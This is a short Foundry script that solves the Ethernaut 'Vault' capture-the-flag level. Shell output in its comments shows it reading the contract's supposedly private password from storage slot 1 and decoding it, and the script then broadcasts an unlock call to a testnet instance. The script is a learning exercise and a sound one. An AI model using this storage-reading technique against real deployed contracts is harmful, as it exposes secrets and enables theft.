// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "ethernaut/Vault/Vault.sol";
import "ethernaut/EthernautTestHelpers.sol";

contract Telephone_Test is Test, EthernautTestHelpers {
    function run() public {
        uint256 PKEY = vm.envUint("DEPLOYMENT_KEY");
        vm.startBroadcast(PKEY);
        Vault instance = Vault(0x90b689dc8CF4f6507E65B0fb3C3B17dCDf5738d7);
        instance.unlock(
            0x412076657279207374726f6e67207365637265742070617373776f7264203a29
        );
        vm.stopBroadcast();
    }
}
// tristan@blue-hydro:~/foundry$ cast storage 0x90b689dc8CF4f6507E65B0fb3C3B17dCDf5738d7 0 --rpc-url mumbai
// 0x0000000000000000000000000000000000000000000000000000000000000001
// tristan@blue-hydro:~/foundry$ cast storage 0x90b689dc8CF4f6507E65B0fb3C3B17dCDf5738d7 1 --rpc-url mumbai
// 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
// tristan@blue-hydro:~/foundry$ cast --to-ascii 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
// A very strong secret password :)
